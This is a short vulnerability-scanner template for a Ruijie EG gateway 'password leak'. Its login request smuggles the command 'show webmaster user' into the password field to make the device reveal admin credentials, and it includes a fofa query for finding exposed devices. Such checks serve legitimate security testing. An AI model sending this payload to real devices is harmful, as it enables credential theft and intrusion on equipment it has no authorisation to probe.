# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      username=admin&password=admin?show+webmaster+user
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"data":'
          - admin
          - '"status":'
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/login.php'
id: ruijie-eg-password-leak
info:
  author: Search?=Null
  description: 'fofa: app="Ruijie-EG易网关"'
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Ruijie EG Information Disaclosure
  severity: high
  tags: ruijie,disclosure,argus-import
